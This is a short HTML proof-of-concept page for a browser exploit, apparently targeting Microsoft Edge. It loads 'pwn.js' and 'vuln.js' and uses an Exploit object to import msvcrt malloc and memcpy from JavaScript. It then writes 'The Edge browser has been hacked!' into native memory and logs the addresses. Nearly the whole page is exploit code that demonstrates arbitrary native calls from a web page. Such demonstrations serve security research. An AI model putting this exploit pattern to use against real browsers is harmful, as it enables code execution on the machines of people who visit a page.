<!doctype html>
<html>
    <body>
        <pre id="content"></pre>
        <script src="pwn.js"></script>
        <script src="vuln.js"></script>
        <script>
            function log(s) { document.getElementById('content').innerHTML += s + '<br>'; }

            with (new Exploit()) {
                log('msvcrt!malloc function address: ' + importFunction('msvcrt.dll', 'malloc'));
                var malloc = importFunction('msvcrt.dll', 'malloc');
				var dest = malloc(0x100);
				log('malloc allocate memory address:0x' + dest.toString(16));
				
				var str_addr = new CString("The Edge browser has been hacked!");
				
				var memcpy = importFunction('msvcrt.dll', 'memcpy');
				memcpy( dest, str_addr, 33);
				log("write 'The Edge browser has been hacked!' to the  address:0x" + dest.toString(16));
            }
        </script>
    </body>
</html>
